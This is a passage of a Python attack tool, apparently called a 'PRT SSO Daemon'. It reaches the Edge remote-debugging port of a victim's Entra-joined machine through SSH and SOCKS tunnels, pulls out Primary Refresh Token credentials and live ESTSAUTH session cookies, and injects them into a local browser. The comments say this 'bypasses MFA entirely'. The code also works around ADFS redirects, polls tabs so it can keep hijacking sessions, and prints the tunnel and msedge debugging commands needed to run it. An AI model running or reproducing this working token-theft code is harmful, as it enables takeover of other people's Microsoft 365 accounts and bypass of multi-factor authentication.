            if "login.microsoftonline.com" in loc and "client_id=" in loc:
                auth_url = loc
                break
        if not auth_url and "login.microsoftonline.com" in resp.url and "client_id=" in resp.url:
            auth_url = resp.url
    except Exception as e:
        print("[!] Could not prefetch authorize URL: {}".format(e))
        return []

    if not auth_url:
        print("[!] No AAD authorize URL in portal redirect — skipping PRT prefetch.")
        return []

    print("[+] Pre-extracting PRT credentials from authorize URL ...")
    try:
        if ENTRA_CDP_PORT > 0:
            creds = _entra_cdp_extract(ENTRA_CDP_PORT, auth_url)
        else:
            creds = _prt_extract_remote(auth_url)
        print("[+] Pre-fetched {} PRT credential(s): {}".format(
            len(creds), ", ".join(c["name"] for c in creds)))
        return creds
    except Exception as e:
        print("[!] PRT prefetch failed: {}".format(e))
        return []


def _inject_prt_cookies(port, creds):
    """Inject PRT credential cookies (x-ms-RefreshTokenCredential,
    x-ms-DeviceCredential) plus brcap=1 into local Edge via CDP without
    navigating.  Used at startup so all SSO cookies are present before
    the first navigation to portal.azure.com.
    """
    if not creds:
        return
    try:
        tabs = _get_tabs(port)
        if not tabs:
            print("[!] No Edge tabs found for PRT cookie injection.")
            return
        sess = _page_session(port, tabs[0])
        try:
            sess.send("Network.enable", {})
        except Exception:
            pass
        injected = 0
        for cred in creds:
            try:
                sess.send("Network.setCookie", {
                    "name":     cred["name"],
                    "value":    cred["data"],
                    "domain":   ".login.microsoftonline.com",
                    "path":     "/",
                    "secure":   True,
                    "httpOnly": False,
                    "url":      "https://login.microsoftonline.com/",
                })
                injected += 1
            except Exception as e:
                print("[!] Could not inject PRT cookie {}: {}".format(cred["name"], e))
        try:
            sess.send("Network.setCookie", {
                "name":     "brcap",
                "value":    "1",
                "domain":   ".login.microsoftonline.com",
                "path":     "/",
                "secure":   False,
                "httpOnly": False,
                "url":      "https://login.microsoftonline.com/",
            })
        except Exception as e:
            print("[!] Could not inject brcap cookie: {}".format(e))
        sess.close()
        print("[+] Injected {} PRT credential cookie(s) + brcap=1.".format(injected))
    except Exception as e:
        print("[!] PRT cookie injection failed: {}".format(e))


def _inject_session_cookies(port, cookies):
    """Inject ESTS session cookies from the Entra machine into local Edge via CDP.
    Reuses first available tab.  These cookies (ESTSAUTH / ESTSAUTHPERSISTENT) were
    already issued by AAD after the Entra machine completed its MFA challenge, so
    injecting them makes AAD believe this browser has a live, MFA-satisfied session.
    The PRT flow in _watch_forever() still handles any /authorize prompts that slip
    through (e.g. after session expiry).
    """
    if not cookies:
        return
    try:
        tabs = _get_tabs(port)
        if not tabs:
            print("[!] No Edge tabs found for session-cookie injection.")
            return
        sess = _page_session(port, tabs[0])
        injected = 0
        for c in cookies:
            params = {
                "name":     c["name"],
                "value":    c["value"],
                "domain":   c.get("domain", ".login.microsoftonline.com"),
                "path":     c.get("path", "/"),
                "secure":   c.get("secure", True),
                "httpOnly": c.get("httpOnly", True),
                "sameSite": c.get("sameSite", "None"),
            }
            if c.get("expires", -1) > 0:
                params["expires"] = c["expires"]
            try:
                sess.send("Network.setCookie", params)
                injected += 1
            except Exception as e:
                print("[!] Could not inject cookie {}: {}".format(c["name"], e))
        sess.close()
        print("[+] Injected {}/{} session cookies.".format(injected, len(cookies)))
    except Exception as e:
        print("[!] Session cookie injection failed: {}".format(e))


# ---------------------------------------------------------------------------
# AAD helpers
# ---------------------------------------------------------------------------
def _inject_cookie_with_session(sess, creds, authorize_url):
    """Inject all PRT credentials plus brcap=1 into an already-open CDP
    session and navigate.  Separated from _inject_cookie so the caller can
    pre-open the session before making slow remote calls.
    Network.enable is called first so that Network.setCookie is accepted even
    while the page is mid-navigation (otherwise Edge silently ignores the
    command when the document is in a loading state).
    """
    try:
        sess.send("Network.enable", {})
    except Exception:
        pass
    for i, cred in enumerate(creds):
        sess.send("Network.setCookie", {
            "name":     cred["name"],
            "value":    cred["data"],
            "domain":   ".login.microsoftonline.com",
            "path":     "/",
            "secure":   True,
            "httpOnly": False,
            "url":      "https://login.microsoftonline.com/",
        })
    sess.send("Network.setCookie", {
        "name":     "brcap",
        "value":    "1",
        "domain":   ".login.microsoftonline.com",
        "path":     "/",
        "secure":   False,
        "httpOnly": False,
        "url":      "https://login.microsoftonline.com/",
    })
    sess.send_nowait("Page.navigate", {"url": authorize_url})
    sess.close()


def _inject_cookie(port, tab_id, creds, authorize_url):
    """Open a fresh CDP session for tab_id and inject.
    Falls back to this path only when no pre-opened session is available.
    """
    tabs = _get_tabs(port)
    tab  = next(t for t in tabs if t["id"] == tab_id)
    sess = _page_session(port, tab)
    _inject_cookie_with_session(sess, creds, authorize_url)


def _keepalive_loop(sess, stop_event, interval=5):
    """Send a no-op CDP ping every `interval` seconds until stop_event is set.
    Prevents Edge from closing an idle WebSocket while we wait for the agent."""
    while not stop_event.wait(interval):
        if not sess.is_alive():
            break
        sess.ping()


def _handle_adfs(port, tab_id, adfs_url):
    """Recovery path for tabs that landed on an ADFS login page.

    AAD redirected the tab to ADFS because it saw a federated domain.  The
    poller missed the brief stop at login.microsoftonline.com.  Fix:
      1. Inject the live ESTS session cookies for login.microsoftonline.com
         into the tab — these prove an active AAD session.
      2. Navigate back (history.go(-1)) so the tab returns to the AAD
         /authorize URL.  With ESTS cookies now present AAD will skip the
         ADFS redirect and either complete auth silently or land on an
         authorize URL the main poller will catch.
    """
    print("[+] ADFS redirect on tab {} — re-injecting session cookies and going back.".format(
        tab_id[:8]))
    try:
        tabs = _get_tabs(port)
        tab  = next((t for t in tabs if t["id"] == tab_id), None)
        if tab is None:
            return
        sess = _page_session(port, tab)
        try:
            sess.send("Network.enable", {})
        except Exception:
            pass
        # Re-inject all ESTS / session cookies for login.microsoftonline.com
        injected = 0
        for c in _session_cookies:
            try:
                sess.send("Network.setCookie", {
                    "name":     c["name"],
                    "value":    c["value"],
                    "domain":   c.get("domain", ""),
                    "path":     c.get("path", "/"),
                    "secure":   c.get("secure", True),
                    "httpOnly": c.get("httpOnly", True),
                    "sameSite": c.get("sameSite", "None"),
                })
                injected += 1
            except Exception:
                pass
        if injected:
            print("[+] Re-injected {} session cookie(s) — navigating back.".format(injected))
        # Go back to the AAD /authorize URL
        sess.send("Runtime.evaluate", {"expression": "history.go(-1)"})
        sess.close()
    except Exception as e:
        print("[!] _handle_adfs failed: {}".format(e))


def _handle_auth(port, tab_id, url):
    """
    Full auth sequence for one AAD authorize URL:
      1. Open a CDP WebSocket to the tab FIRST, before the agent round-trip.
      2. Run a background keepalive thread to prevent Edge closing the idle WS.
      3. Ask agent for ALL PRT credentials bound to the nonce in the URL.
      4. Inject credentials + brcap=1 cookies, navigate.
    """
    t0 = time.time()

    # Step 1 — open CDP session before any slow network call
    try:
        tabs = _get_tabs(port)
        tab  = next((t for t in tabs if t["id"] == tab_id), None)
        if tab is None:
            print("[!] Tab {} disappeared before CDP session could be opened.".format(tab_id[:8]))
            return
        sess = _page_session(port, tab)
    except Exception as e:
        print("[!] Could not open CDP session for tab {}: {}".format(tab_id[:8], e))
        traceback.print_exc()
        return

    # Step 2 — start background keepalive so Edge conserves the WebSocket
    stop_ka = threading.Event()
    ka_thread = threading.Thread(target=_keepalive_loop, args=(sess, stop_ka, 5),
                                 daemon=True, name="cdp-keepalive-" + tab_id[:8])
    ka_thread.start()

    # Cookies-only mode: skip PRT extraction; inject session cookies directly.
    if ENTRA_CDP_PROFILE == -1:
        stop_ka.set()
        ka_thread.join(timeout=2)
        if _session_cookies:
            print("[+] Cookies-only mode — injecting session cookies for tab {}.".format(tab_id[:8]))
            try:
                sess.send("Network.enable", {})
                for c in _session_cookies:
                    try:
                        sess.send("Network.setCookie", {
                            "name":     c["name"],
                            "value":    c["value"],
                            "domain":   c.get("domain", ""),
                            "path":     c.get("path", "/"),
                            "secure":   c.get("secure", True),
                            "httpOnly": c.get("httpOnly", True),
                            "sameSite": c.get("sameSite", "None"),
                        })
                    except Exception:
                        pass
                sess.send_nowait("Page.navigate", {"url": url})
                sess.close()
                print("[+] Navigated with session cookies. (+{:.1f}s total)".format(time.time() - t0))
            except Exception as e2:
                print("[!] Session-cookie inject failed: {}".format(e2))
                sess.close()
        else:
            print("[!] Cookies-only mode — no session cookies available for tab {}.".format(tab_id[:8]))
            sess.close()
        return

    # Step 3 — fetch credentials (slow — travels through tunnel)
    print("[+] Requesting credentials from agent for tab {} ...".format(tab_id[:8]))
    try:
        if ENTRA_CDP_PORT > 0:
            creds = _entra_cdp_extract(ENTRA_CDP_PORT, url)
        else:
            creds = _prt_extract_remote(url)
    except Exception as e:
        print("[!] Credential extract failed: {}".format(e))
        stop_ka.set()
        ka_thread.join(timeout=2)
        # Fallback: re-inject the live ESTS session cookies into the tab and
        # navigate.  If the Entra machine's browser session is still valid, AAD
        # will recognise the ESTSAUTH cookie and bypass the auth challenge,
        # logging in as whichever user is active in the Entra browser — no PRT
        # required.  This is the path that works when the Entra machine is
        # signed into Azure as a user other than the Windows OS account.
        if _session_cookies:
            print("[+] PRT unavailable — falling back to session-cookie inject for tab {}.".format(
                tab_id[:8]))
            try:
                sess.send("Network.enable", {})
                for c in _session_cookies:
                    try:
                        sess.send("Network.setCookie", {
                            "name":     c["name"],
                            "value":    c["value"],
                            "domain":   c.get("domain", ""),
                            "path":     c.get("path", "/"),
                            "secure":   c.get("secure", True),
                            "httpOnly": c.get("httpOnly", True),
                            "sameSite": c.get("sameSite", "None"),
                        })
                    except Exception:
                        pass
                sess.send_nowait("Page.navigate", {"url": url})
                sess.close()
                print("[+] Navigated with session-cookie fallback. (+{:.1f}s total)".format(
                    time.time() - t0))
            except Exception as e2:
                print("[!] Session-cookie fallback failed: {}".format(e2))
                sess.close()
        else:
            sess.close()
        return
    names = ", ".join(c["name"] for c in creds)
    print("[+] Got {} credential(s): {} (+{:.1f}s)".format(
        len(creds), names, time.time() - t0))

    # Stop keepalive before we start inject (avoids lock contention on _lock)
    stop_ka.set()
    ka_thread.join(timeout=2)

    # Step 4 — inject through the already-open session
    try:
        _inject_cookie_with_session(sess, creds, url)
        print("[+] Injected — navigating. (+{:.1f}s total)".format(time.time() - t0))
    except Exception as e:
        print("[!] Cookie inject failed: {}".format(e))
        traceback.print_exc()
        sess.close()


def _watch_forever(port):
    """
    Poll all browser targets continuously.  Whenever any page tab lands on
    an AAD authorize URL that hasn't been handled yet, call _handle_auth.
    When a tab lands on an ADFS login page (AAD federated-domain redirect),
    call _handle_adfs to re-inject session cookies and send the tab back to
    AAD so the normal authorize flow can complete without ADFS credentials.
    """
    # Two-level dedup:
    #   handled_exact  — (tab_id, url) pairs already dispatched (permanent)
    #   tab_cooldown   — tab_id → deadline timestamp; ignore that tab until then
    #                    Prevents re-triggering on new nonce/state variants of the
    #                    same authorize request while AAD is mid-redirect-chain.
    COOLDOWN_SECS  = 15
    handled_exact  = set()
    tab_cooldown   = {}   # tab_id → float (time.time() + COOLDOWN_SECS)
    print("[*] Watching all Edge tabs for AAD auth — press Ctrl-C to stop.\n")
    while True:
        try:
            time.sleep(0.1)
            targets = requests.get(
                "http://127.0.0.1:{}/json/list".format(port), timeout=5
            ).json()
        except KeyboardInterrupt:
            raise
        except Exception:
            continue

        now = time.time()
        # Purge expired cooldowns to keep the dict from growing unbounded
        tab_cooldown = {k: v for k, v in tab_cooldown.items() if v > now}

        for t in targets:
            if t.get("type") != "page":
                continue
            tab_id = t.get("id", "")
            url    = t.get("url", "")

            key = (tab_id, url)
            if key in handled_exact:
                continue

            # Skip tabs that are still in their post-injection cooldown window
            if tab_cooldown.get(tab_id, 0) > now:
                continue

            # ADFS redirect — AAD sent the tab to federated IdP before we caught it
            if "/adfs/" in url:
                handled_exact.add(key)
                tab_cooldown[tab_id] = now + COOLDOWN_SECS
                print("[+] ADFS on tab {} | {}".format(tab_id[:8], url[:90]))
                threading.Thread(target=_handle_adfs, args=(port, tab_id, url),
                                 daemon=True, name="adfs-" + tab_id[:8]).start()
                continue

            # Normal AAD authorize URL
            if "login.microsoftonline.com" not in url:
                continue
            if "client_id=" not in url:
                continue
            handled_exact.add(key)
            tab_cooldown[tab_id] = now + COOLDOWN_SECS
            print("[+] AAD auth on tab {} | {}".format(tab_id[:8], url[:90]))
            _handle_auth(port, tab_id, url)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        description="Persistent AAD SSO daemon via direct Entra Edge CDP")
    ap.add_argument("--entra-cdp-port", type=int, default=0, required=True,
                    help="CDP port of Entra machine's Edge (required)")
    ap.add_argument("--entra-cdp-sso-profile", type=int, default=0, metavar="N",
                    help="Profile #N for PRT extraction (1-based). Prompted interactively if omitted.")
    ap.add_argument("--entra-cdp-cookie-profile", type=int, default=0, metavar="N",
                    help="Profile #N for cookie import (1-based). Prompted interactively if omitted.")
    ap.add_argument("--entra-cdp-socks", type=int, default=1080, metavar="PORT",
                    help="Local SOCKS5 port used by the script to reach the Entra CDP "
                         "port (default: 1080). Builds socks5h://127.0.0.1:PORT.")
    ap.add_argument("--edge-proxy", default="", metavar="URL",
                    help="Proxy URL passed directly to the local Edge's --proxy-server. "
                         "Examples: socks5h://127.0.0.1:1080  http://127.0.0.1:8080")
    args = ap.parse_args()

    SOCKS_PROXY     = "socks5h://127.0.0.1:{}".format(args.entra_cdp_socks)
    EDGE_PROXY      = args.edge_proxy
    ENTRA_CDP_PORT  = args.entra_cdp_port

    globals()["SOCKS_PROXY"]              = SOCKS_PROXY
    globals()["EDGE_PROXY"]               = EDGE_PROXY
    globals()["ENTRA_CDP_PORT"]           = ENTRA_CDP_PORT
    globals()["ENTRA_CDP_PROFILE"]        = args.entra_cdp_sso_profile
    globals()["ENTRA_CDP_COOKIE_PROFILE"] = args.entra_cdp_cookie_profile

    print("=" * 60)
    print("  PRT SSO Daemon  (Edge direct CDP)")
    print("=" * 60 + "\n")

    print("  Entra CDP : 127.0.0.1:{}".format(ENTRA_CDP_PORT))
    print("  Entra SOCKS : {}".format(SOCKS_PROXY))
    print("  Edge proxy  : {}".format(EDGE_PROXY or "(none)"))
    print()

    if not EDGE_PROXY:
        print("  [!] WARNING: --edge-proxy is not set. Browser traffic will NOT be")
        print("      routed through the Entra machine — it will exit via your local")
        print("      internet connection instead.")
        try:
            ans = input("  Continue without a proxy? [y/N]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            ans = "n"
        if ans not in ("y", "yes"):
            print("  Aborting.")
            sys.exit(1)
        print()
    elif EDGE_PROXY.startswith("http://") or EDGE_PROXY.startswith("https://"):
        print("  [!] HTTP proxy detected (likely Burp Suite).")
        print("      Make sure Burp's SOCKS proxy is configured:")
        print("      Project options → Connections → SOCKS Proxy")
        print("        Host: 127.0.0.1   Port: {}   Version: SOCKS5".format(args.entra_cdp_socks))
        try:
            ans = input("  Is SOCKS upstream configured in Burp? [y/N]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            ans = "n"
        if ans not in ("y", "yes"):
            print("  Aborting. Configure Burp upstream SOCKS and retry.")
            sys.exit(1)
        print()

    # Verify the Entra CDP port is reachable via SOCKS
    print("[+] Checking Entra Edge CDP via SOCKS ({}) → 127.0.0.1:{} ...".format(
        SOCKS_PROXY, ENTRA_CDP_PORT))
    try:
        with _agent_session() as s:
            r = s.get(
                "http://127.0.0.1:{}/json/version".format(ENTRA_CDP_PORT), timeout=10)
        r.raise_for_status()
        ver = r.json()
        print("[+] Entra Edge reachable — {}".format(
            ver.get("Browser", ver.get("User-Agent", "?"))[:60]))
        profiles = _entra_cdp_get_profiles(ENTRA_CDP_PORT)
        if profiles:
            print()
            print("  Profiles on Entra Edge:")
            for p in profiles:
                sso_tag = "  [SSO extension]" if p["has_sso_ext"] else ""
                print("    [{}] {}{}".format(p["index"], p["label"], sso_tag))
            print()
            # PRT profile: always prompt
            if args.entra_cdp_sso_profile == 0:
                sso_profiles = [p for p in profiles if p["has_sso_ext"]]
                if not sso_profiles:
                    print("  (SSO extension not detected in any profile — may not be running yet)")
                print("  [0] None (cookies only — skip PRT extraction)")
                while True:
                    try:
                        raw = input("  Select profile for PRT extraction [0=none, 1-{}]: ".format(
                            len(profiles))).strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        raw = "0"
                    if raw == "0":
                        args.entra_cdp_sso_profile = -1   # sentinel: no PRT
                        break
                    if raw.isdigit() and 1 <= int(raw) <= len(profiles):
                        args.entra_cdp_sso_profile = int(raw)
                        break
                    print("  Please enter 0 or a number between 1 and {}.".format(len(profiles)))
            if args.entra_cdp_cookie_profile == 0:
                print("  [0] None (skip session-cookie import)")
                while True:
                    try:
                        raw = input("  Select profile for cookie import [0=none, 1-{}]: ".format(
                            len(profiles))).strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        raw = "0"
                    if raw == "0":
                        args.entra_cdp_cookie_profile = -1   # sentinel: no cookies
                        break
                    if raw.isdigit() and 1 <= int(raw) <= len(profiles):
                        args.entra_cdp_cookie_profile = int(raw)
                        break
                    print("  Please enter 0 or a number between 1 and {}.".format(len(profiles)))
            # Apply selected profile indices as globals
            globals()["ENTRA_CDP_PROFILE"]        = args.entra_cdp_sso_profile
            globals()["ENTRA_CDP_COOKIE_PROFILE"] = args.entra_cdp_cookie_profile
            ENTRA_CDP_PROFILE        = args.entra_cdp_sso_profile
            ENTRA_CDP_COOKIE_PROFILE = args.entra_cdp_cookie_profile
            prt_label    = "None (cookies only)" if args.entra_cdp_sso_profile == -1 else \
                           next(p["label"] for p in profiles if p["index"] == args.entra_cdp_sso_profile)
            cookie_label = "None (skip import)" if args.entra_cdp_cookie_profile == -1 else \
                           next(p["label"] for p in profiles if p["index"] == args.entra_cdp_cookie_profile)
            print()
            print("  Using:")
            print("    PRT profile    : [{}] {}".format(args.entra_cdp_sso_profile, prt_label))
            print("    Cookie profile : [{}] {}".format(args.entra_cdp_cookie_profile, cookie_label))
            print()
        else:
            print("[!] Could not enumerate Entra profiles — proceeding with defaults.")
    except Exception as e:
        err_str = str(e).lower()
        print("[!] Cannot reach Entra Edge CDP via SOCKS: {}".format(e))
        if "refused" in err_str or "10061" in err_str or "111" in err_str:
            print()
            print("  >> SOCKS proxy refused connection — most likely the SSH tunnels are not up.")
            print("     On the Entra machine:")
            print("       ssh -R {p}:127.0.0.1:{p} sshsrv   (or ask your admin for the correct -R args)".format(p=args.socks_port))
            print("     On this machine:")
            print("       ssh -L {p}:127.0.0.1:{p} sshsrv".format(p=args.socks_port))
        elif "remoteDisconnected" in str(e) or "remote end closed" in err_str or "connection aborted" in err_str:
            print()
            print("  >> Edge DevTools rejected the request (empty response).")
            print("     This is Edge's origin/host-header security check (Edge 118+).")
            print("     Make sure Edge on the Entra machine is started with:")
            print("       msedge --remote-debugging-port={} --remote-allow-origins=*".format(ENTRA_CDP_PORT))
        else:
            print("    Check:")
            print("      1. Edge running on Entra machine:")
            print("           msedge --remote-debugging-port={} --remote-allow-origins=*".format(ENTRA_CDP_PORT))
            print("      2. SSH reverse SOCKS on Entra machine:")
            print("           ssh -R {p}:127.0.0.1:{p} sshsrv".format(p=args.socks_port))
            print("      3. Local SOCKS forward on this machine:")
            print("           ssh -L {p}:127.0.0.1:{p} sshsrv".format(p=args.socks_port))
        sys.exit(1)

    if not os.path.exists(EDGE_EXE):
        print("[!] Edge not found at:", EDGE_EXE)
        sys.exit(1)

    # 1. Claim an instance slot (determines profile dir and CDP port)
    is_first, _profile, _port = _pick_instance_slot()
    globals()["EDGE_PROFILE"]    = _profile
    globals()["EDGE_DEBUG_PORT"] = _port
    EDGE_PROFILE    = _profile
    EDGE_DEBUG_PORT = _port
    print("[+] Instance slot: profile={} cdp_port={} ({})".format(
        _profile, _port, "first — will clear old profiles" if is_first else "additional instance"))

    # 1. Launch Edge
    _launch_edge(is_first)
    time.sleep(1.0)

    # 2. Inject live ESTS session cookies from the Entra machine (bypasses MFA entirely)
    if ENTRA_CDP_COOKIE_PROFILE == -1:
        print("[*] Session-cookie import disabled.")
    else:
        print("[+] Fetching live session cookies from Entra machine ...")
        session_cookies = _entra_cdp_session_cookies(ENTRA_CDP_PORT)
        if session_cookies:
            globals()["_session_cookies"] = session_cookies
            _inject_session_cookies(EDGE_DEBUG_PORT, session_cookies)
        else:
            print("[!] No session cookies retrieved — PRT flow will handle auth challenges.")

    # 2b. Pre-extract and inject PRT credentials (x-ms-RefreshTokenCredential,
    #     x-ms-DeviceCredential, brcap=1) so they are already present in the
    #     cookie store before the first navigation to myaccount.microsoft.com.
    #     We follow myaccount.microsoft.com's redirect chain through the SOCKS proxy to
    #     get a real AAD authorize URL (with a live nonce), extract credentials for
    #     it, and inject them now.  _watch_forever() remains the authoritative
    #     handler for any subsequent authorize challenges.
    prt_creds = _prefetch_prt_creds()
    if prt_creds:
        _inject_prt_cookies(EDGE_DEBUG_PORT, prt_creds)
    else:
        print("[!] PRT credential prefetch skipped — will inject on demand in watch loop.")

    # 3. Open myaccount.microsoft.com in the first tab
    tabs = _get_tabs(EDGE_DEBUG_PORT)
    tab  = tabs[0]
    print("[+] Navigating to https://myaccount.microsoft.com ...")
    sess = _page_session(EDGE_DEBUG_PORT, tab)
    sess.send_nowait("Page.navigate", {"url": "https://myaccount.microsoft.com/"})
    sess.close()

    # 4. Watch forever — handles the initial portal auth, sso_reload pass,
    #    and any future auth triggered by SharePoint, Teams, etc.
    try:
        _watch_forever(EDGE_DEBUG_PORT)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
